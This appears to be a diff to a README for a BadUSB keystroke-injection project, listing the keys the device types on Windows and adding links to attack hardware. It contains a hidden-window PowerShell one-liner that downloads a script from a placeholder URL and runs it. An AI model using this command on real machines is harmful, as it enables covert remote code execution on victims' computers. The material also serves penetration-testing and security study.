@@ -21,19 +21,22 @@
 </picture>
 
 
-## Keys pressed by BadUSB
+## Keys pressed by the BadUSB
 
 1. `WIN` + `r` which opens a command prompt
     ![Windows 10 Run Command](assets/Windows10RunCommand.png)
 2. type `powershell -w h "IEX(iwr('URL'))"` where `URL` is  the url to a powershell script to execute
 3. `ENTER` to run the command
 
+## Programming & Hardware
+See instructions for  [EvilCrowCable-Pro](https://github.com/joelsernamoreno/EvilCrowCable-Pro) at [/evil_crow_cable](/evil_crow_cable) \
+and for [WHID injector](https://github.com/whid-injector/WHID) (recommended) at [/whid_injector](/whid_injector)
+
+
 ## Keyboard layout
 The keyboard layout used for the BadUSB has to match the one chosen at the OS. \
 If this is not the case,
 some keys which are placed at different locations in the different layouts will output the wrong character.
-
-For Arduino's keyboard library, this can be adapted for example using [github.com/Necr0tizing/ArduinoKeyboardLayouts](https://github.com/Necr0tizing/ArduinoKeyboardLayouts)
 
 # Payloads
 
